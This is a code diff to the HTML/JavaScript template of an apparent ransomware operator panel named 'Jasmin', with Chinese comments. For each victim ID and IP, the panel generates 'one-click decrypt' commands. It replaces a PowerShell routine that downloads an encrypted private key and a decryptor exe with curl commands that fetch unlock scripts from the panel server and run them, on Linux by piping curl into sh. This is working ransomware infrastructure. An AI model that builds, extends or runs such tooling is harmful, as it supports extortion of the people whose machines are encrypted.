@@ -202,26 +202,11 @@
 <div class="dt-step"><span>1</span>在目标机打开 PowerShell (管理员)</div>
 <div class="dt-step"><span>2</span>复制下方命令直接运行</div>
 <div class="dt-note"><i class="fas fa-shield-alt"></i> 自动下载私钥+解密器、执行解密、清理临时文件</div>
-<pre class="dt-code">$tmp="$env:TEMP\jasmin_dec"
-New-Item -ItemType Directory -Force -Path $tmp | Out-Null
-$k="{{ aes_key }}"
-Invoke-WebRequest "{{ request.url_root }}payloads/jasmin_private.pem.enc" -OutFile "$tmp\key.enc"
-# AES解密私钥
-$raw=[Convert]::FromBase64String((Get-Content "$tmp\key.enc" -Raw))
-$iv=$raw[0..15]; $ct=$raw[16..($raw.Length-1)]
-$aes=[System.Security.Cryptography.Aes]::Create()
-$aes.Key=[System.Text.Encoding]::UTF8.GetBytes($k)
-$aes.IV=[byte[]]$iv; $aes.Padding="PKCS7"; $aes.Mode="CBC"
-$dec=$aes.CreateDecryptor()
-$ms=New-Object IO.MemoryStream(,[byte[]]$ct)
-$cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,"Read")
-$sr=New-Object IO.StreamReader($cs)
-[IO.File]::WriteAllText("$tmp\key.pem",$sr.ReadToEnd())
-$sr.Close();$cs.Close();$ms.Close()
-# 注: 需先将 Jasmin_Decryptor.exe 放入 payloads/ (仓库未附编译产物)
-Invoke-WebRequest "{{ request.url_root }}payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
-& "$tmp\dec.exe" "$tmp\key.pem"
-Remove-Item -Recurse -Force $tmp</pre>
+<pre class="dt-code">:: 纯 PowerShell 实现，无需编译 exe
+:: 要求 PowerShell 7+   (未装可执行: winget install Microsoft.PowerShell)
+curl.exe -sL {{ request.url_root }}payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1
+pwsh -File jasmin_unlock.ps1 -Server {{ request.url_root }} -K "{{ aes_key }}" -Paths C:\path\to\decrypt
+:: -Paths 换成要解密的目录；不写则解密当前目录</pre>
 </div>
 <div class="dt-content" id="dt-linux" style="display:none">
 <h3>🐧 Linux 一键解密</h3>
@@ -318,7 +303,7 @@ function showDecrypt(vid,ip,isLinux){
   if(isLinux){
     td.innerHTML='<pre class="dt-code"># '+ip+' 一键解密 — 纯 openssl 零依赖\n# 末尾加要解密的目录，不写则解当前目录\ncurl -sL '+srv+'/payloads/jasmin_unlock.sh | sh -s '+srv+' "'+k+'" /path/to/decrypt</pre>';
   }else{
-    td.innerHTML='<pre class="dt-code">$tmp=\\"$env:TEMP\\jasmin_dec\\"\n$k=\\"'+k+'\\"\npowershell commands here...</pre>';
+    td.innerHTML='<pre class="dt-code">:: '+ip+' 一键解密 — 纯 PowerShell，无需编译 exe\\n:: 要求 PowerShell 7+   (winget install Microsoft.PowerShell)\\ncurl.exe -sL '+srv+'/payloads/jasmin_unlock.ps1 -o jasmin_unlock.ps1\\npwsh -File jasmin_unlock.ps1 -Server '+srv+' -K \"'+k+'\" -Paths C:\\\\path\\\\to\\\\decrypt</pre>';
   }
   nr.appendChild(td);tr.after(nr);_decOpen=nr;
 }
